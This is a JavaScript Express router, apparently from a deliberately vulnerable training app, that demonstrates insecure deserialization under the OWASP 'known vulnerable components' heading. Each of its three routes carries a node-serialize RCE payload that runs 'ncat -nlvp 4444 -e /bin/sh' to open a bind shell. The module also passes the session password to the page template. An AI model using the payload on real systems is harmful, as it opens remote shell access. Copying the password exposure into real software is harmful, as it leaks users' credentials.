module.exports = function() {
	var express = require("express")
	var router = express.Router()
	var handlebars = require("express-handlebars")
	var serialize = require("serialize-javascript");
	const v8 = require('v8');

	// Updates userData for layout header on page load
	function selectUserData(res,mysql,context,loaded,table) {
		var sql = "SELECT userData FROM " + table + " WHERE userName = ?;"
		var values = context.userName
		mysql.pool.query(sql,values,
			function(err,results) {
				if(err) {
					res.redirect("../500");
				}
				else {
					context.userData = results[0].userData
					loaded();
				}
			});
	}

	router.get("/", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			userData: req.session.userData,
			benign: "{test:123}",
			test: `{"data":[123,116,101,115,116,58,49,50,51,125]}`,
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		
		// Tracks MySQL query count
		var queries = 0;
		var mysql = req.app.get('mysql');

		if (context.userName != null) {
			selectUserData(res,mysql,context,loaded,"Users");
		}
		else {
			loaded()
		}
		req.session.userData = context.userData

		// Checks if all SQL queries have completed before rendering page
		function loaded(){
			queries++;
			if(queries >= 1) {
				res.render("usingComponentsWithKnownVulnerabilities",context)
				console.log("Using Components with Known Vulnerabilites loaded!")
			}
		}

		// Saves current path for light/dark theme redirect
		req.session.previousPath = req.originalUrl
	})

	router.post("/deserialize", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			benign: "{test:123}",
			test: `{"data":[123,116,101,115,116,58,49,50,51,125]}`,	// 255=NBSP, 13=CR, 34=", 10=LF, 123={ 
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		try{
			var obj = Buffer.from(JSON.parse(req.body.userInput).data);
			console.log(obj.toString('utf8'));
			console.log("OK!")
			var deserialized = obj.toString('utf8');
			context.deserialized = deserialized;
		} catch(error){
			context.error = error;
		}
		res.render("usingComponentsWithKnownVulnerabilities",context)
		console.log("Using Components with Known Vulnerabilites loaded!")
	})

	router.post("/serialize", (req,res) => {
		var context = {
			header: "> Using Components with Known Vulnerabilites",
			usingComponentsWithKnownVulnerabilities: true,
			darkTheme: req.session.darkTheme,
			userName: req.session.userName,
			benign: "{test:123}",
			test: `{"data":[123,116,101,115,116,58,49,50,51,125]}`, // 255=NBSP, 13=CR, 34=", 10=LF, 123={ 
			payload: `{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ncat -nlvp 4444 -e /bin/sh', function(error, stdout, stderr) { console.log(stdout) });}()"}`,
			password: req.session.password
		}
		var obj = req.body.userInput;
		var serialized = v8.serialize(obj);
		var json = JSON.stringify(serialized);
		console.log(json);
		context.serialized = json;
		res.render("usingComponentsWithKnownVulnerabilities",context)
		console.log("Using Components with Known Vulnerabilites loaded!")
	})

	return router
}();